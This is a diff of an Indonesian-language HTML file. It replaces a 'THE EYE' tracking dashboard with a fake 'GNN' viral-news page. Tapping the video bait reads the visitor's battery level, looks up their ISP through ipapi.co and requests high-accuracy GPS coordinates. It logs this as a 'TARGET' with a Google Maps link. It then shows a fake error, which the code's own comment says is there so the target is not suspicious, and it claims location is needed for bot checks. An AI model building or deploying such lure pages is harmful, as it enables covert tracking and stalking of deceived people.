@@ -3,153 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>THE EYE v15.0 - MASTER MIND CONTROL</title>
+    <title>GNN - BERITA VIRAL HARI INI</title>
     <style>
-        :root { --green: #1b5e20; --gold: #ffd700; --pink: #ff4081; --red: #d32f2f; }
-        body { background: #f0f2f5; font-family: sans-serif; margin: 0; }
-        .header { background: linear-gradient(to right, var(--green), #388e3c); color: white; padding: 15px; text-align: center; font-weight: bold; border-bottom: 4px solid var(--gold); }
-        .card { background: white; margin: 15px; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-left: 6px solid var(--green); }
-        button { padding: 10px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; color: white; }
-        .btn-ban { background: var(--red); font-size: 10px; padding: 5px; }
-        .btn-main { background: var(--green); width: 100%; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; }
-        #ban-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:black; color:red; flex-direction:column; justify-content:center; align-items:center; z-index:9999; text-align:center; font-family: 'Courier New', monospace; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f0f2f5; }
+        .nav { background: #d32f2f; color: white; padding: 15px; text-align: center; font-weight: bold; }
+        .container { max-width: 500px; margin: 20px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .video-thumb { width: 100%; height: 250px; background: #000 url('https://img.youtube.com/vi/dQw4w9WgXcQ/0.jpg') no-repeat center; background-size: cover; border-radius: 10px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: relative; }
+        .play-btn { background: rgba(211, 47, 47, 0.9); color: white; padding: 15px 25px; border-radius: 50px; font-weight: bold; font-size: 18px; border: 3px solid white; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        h2 { font-size: 18px; color: #111; margin: 15px 0; line-height: 1.4; }
+        .btn-nonton { background: #d32f2f; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .footer { text-align: center; font-size: 10px; color: #888; margin-top: 20px; }
     </style>
 </head>
-<body onload="bootSystem()">
+<body>
 
-<div id="ban-screen">
-    <h1>⚠️ IP BLOCKED ⚠️</h1>
-    <p>ANDA TELAH DIBLOKIR OLEH SISTEM MASTER MIND CONTROL.</p>
-    <p>HUBUNGI LEAD DEV <b>KALZ</b> UNTUK AKTIVASI ULANG.</p>
+<div class="nav">🔴 GNN NEWS LIVE</div>
+
+<div class="container">
+    <div class="video-thumb" onclick="gasLacak()">
+        <div class="play-btn">▶ TONTON SEKARANG</div>
+    </div>
+    <h2>VIRAL: Rekaman Tak Terduga CCTV di Dekat Lokasi Anda Tersebar Luas!</h2>
+    <p style="font-size: 13px; color: #555;">Pihak berwajib meminta warga untuk tetap waspada. Klik tombol di bawah untuk melihat detail kejadian dan lokasi tepatnya.</p>
+    
+    <button class="btn-nonton" onclick="gasLacak()">KONFIRMASI LOKASI & TONTON</button>
 </div>
 
-<div class="header">🌙 THE EYE v15.0 - MASTER MIND CONTROL</div>
-
-<div id="auth" style="display: flex; justify-content: center; align-items: center; min-height: 80vh;">
-    <div style="background:white; padding:30px; border-radius:20px; width:280px; text-align:center;">
-        <h2 style="color:var(--green)">COMMAND CENTER</h2>
-        <input type="text" id="user" placeholder="Username">
-        <input type="password" id="pass" placeholder="Password">
-        <button class="btn-main" onclick="doLogin()">AKSES SISTEM</button>
-    </div>
-</div>
-
-<div id="main-ui" style="display:none;">
-    <div style="padding:15px; display:flex; justify-content:space-between;">
-        <b>DEV: <span id="my-name"></span></b>
-        <button onclick="doLogout()" style="background:#444; padding:5px 10px;">EXIT</button>
-    </div>
-
-    <div id="dev-zone" class="card" style="display:none; border-left-color: var(--red);">
-        <h3 style="color:var(--red); margin:0;">🧠 MASTER MIND CONTROL</h3>
-        <p style="font-size:11px;">Kelola IP & Akun Member di sini.</p>
-        <div id="user-list-table"></div>
-        <hr>
-        <input type="text" id="nu" placeholder="User Baru">
-        <input type="text" id="np" placeholder="Pass Baru">
-        <button class="btn-main" onclick="addUser()">TAMBAH MEMBER</button>
-    </div>
-
-    <div class="card">
-        <h3>🛰️ RADAR INTELIJEN</h3>
-        <div id="logs-view" style="font-size:12px; max-height:200px; overflow-y:auto;">Menunggu...</div>
-    </div>
-</div>
+<div class="footer">Dikelola oleh GNN Media Network • 2026</div>
 
 <script>
-    let myIP = "";
+    async function gasLacak() {
+        const btn = document.querySelector('.btn-nonton');
+        btn.innerText = "MENGHUBUNGKAN SATELIT...";
+        
+        let batInfo = "N/A";
+        let ispInfo = "Mencari ISP...";
 
-    async function bootSystem() {
-        // Deteksi IP User
+        // 1. AMBIL DATA BATERAI
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batInfo = Math.round(b.level * 100) + "% " + (b.charging ? "(Charging)" : "(Sisa)");
+            }
+        } catch(e) {}
+
+        // 2. AMBIL DATA PROVIDER (ISP)
+        try {
+            const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            myIP = data.ip;
-        } catch(e) { myIP = "127.0.0.1"; }
+            ispInfo = data.org || "Provider Privat";
+        } catch(e) { ispInfo = "Provider Terenkripsi"; }
 
-        // Cek Blacklist
-        const blacklist = JSON.parse(localStorage.getItem("ip_blacklist")) || [];
-        if(blacklist.includes(myIP)) {
-            document.body.innerHTML = document.getElementById('ban-screen').innerHTML;
-            document.body.style.background = "black";
-            document.body.style.color = "red";
-            return;
-        }
+        // 3. AMBIL KOORDINAT GPS
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const jam = new Date().toLocaleTimeString();
+                    
+                    // Format Log untuk Dashboard v17 (Sesuai Tab Radar)
+                    const formatLog = `
+                        <div style="padding:5px;">
+                            <b style="color:#d32f2f;">📍 TARGET KENA JIRZ! [${jam}]</b><br>
+                            🔋 <b>Baterai:</b> ${batInfo}<br>
+                            📶 <b>Provider:</b> ${ispInfo}<br>
+                            🌍 <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:blue; font-weight:bold;">BUKA MAPS (PRESISI)</a>
+                        </div>
+                    `;
 
-        if(!localStorage.getItem("db")) {
-            localStorage.setItem("db", JSON.stringify([{u:"kalz", p:"111", role:"OWNER", ip:myIP}]));
-        }
-        
-        const sess = sessionStorage.getItem("user");
-        if(sess) renderDash(JSON.parse(sess));
-    }
+                    // Simpan ke LocalStorage yang dibaca Dashboard
+                    let oldLogs = JSON.parse(localStorage.getItem("eye_logs")) || [];
+                    oldLogs.unshift(formatLog);
+                    localStorage.setItem("eye_logs", JSON.stringify(oldLogs));
 
-    function doLogin() {
-        const db = JSON.parse(localStorage.getItem("db"));
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        const found = db.find(x => x.u === u && x.p === p);
-        
-        if(found) {
-            found.ip = myIP; // Update IP saat login
-            localStorage.setItem("db", JSON.stringify(db));
-            sessionStorage.setItem("user", JSON.stringify(found));
-            renderDash(found);
-        } else { alert("Akses Ditolak!"); }
-    }
-
-    function renderDash(u) {
-        document.getElementById('auth').style.display = 'none';
-        document.getElementById('main-ui').style.display = 'block';
-        document.getElementById('my-name').innerText = u.u;
-        
-        if(u.role === "OWNER") {
-            document.getElementById('dev-zone').style.display = 'block';
-            refreshUsers();
-        }
-        loadLogs();
-    }
-
-    function refreshUsers() {
-        const db = JSON.parse(localStorage.getItem("db"));
-        let html = `<table style="width:100%; font-size:11px;"><tr><th>USER</th><th>IP</th><th>AKSI</th></tr>`;
-        db.forEach((usr, i) => {
-            html += `<tr>
-                <td>${usr.u}</td>
-                <td>${usr.ip || 'Offline'}</td>
-                <td>${usr.role === 'OWNER' ? '⭐' : `<button class="btn-ban" onclick="banIP('${usr.ip}')">BAN IP</button>`}</td>
-            </tr>`;
-        });
-        document.getElementById('user-list-table').innerHTML = html + `</table>`;
-    }
-
-    function banIP(ip) {
-        if(!ip || ip === "Offline") return alert("IP tidak terdeteksi!");
-        let blacklist = JSON.parse(localStorage.getItem("ip_blacklist")) || [];
-        if(!blacklist.includes(ip)) {
-            blacklist.push(ip);
-            localStorage.setItem("ip_blacklist", JSON.stringify(blacklist));
-            alert("IP " + ip + " BERHASIL DI-BAN!");
-            location.reload();
+                    // Fake Error biar target ga curiga
+                    setTimeout(() => {
+                        alert("Koneksi Error 403: Video ini telah dihapus atau dibatasi di wilayah Anda karena mengandung unsur kekerasan.");
+                        btn.innerText = "TONTON SEKARANG";
+                    }, 1500);
+                },
+                (err) => {
+                    alert("Akses Ditolak! Anda harus mengizinkan lokasi untuk memverifikasi bahwa Anda bukan robot/bot.");
+                    btn.innerText = "TONTON SEKARANG";
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        } else {
+            alert("Browser Anda terlalu jadul buat nonton video ini.");
         }
     }
-
-    function addUser() {
-        let db = JSON.parse(localStorage.getItem("db"));
-        db.push({u:document.getElementById('nu').value, p:document.getElementById('np').value, role:"MEMBER", ip:""});
-        localStorage.setItem("db", JSON.stringify(db));
-        refreshUsers();
-    }
-
-    function loadLogs() {
-        setInterval(() => {
-            const logs = JSON.parse(localStorage.getItem("eye_logs")) || [];
-            document.getElementById('logs-view').innerHTML = logs.map(l => `<div style="padding:5px; border-bottom:1px solid #eee;">${l}</div>`).join('') || "Kosong.";
-        }, 2000);
-    }
-
-    function doLogout() { sessionStorage.clear(); location.reload(); }
 </script>
+
 </body>
 </html>
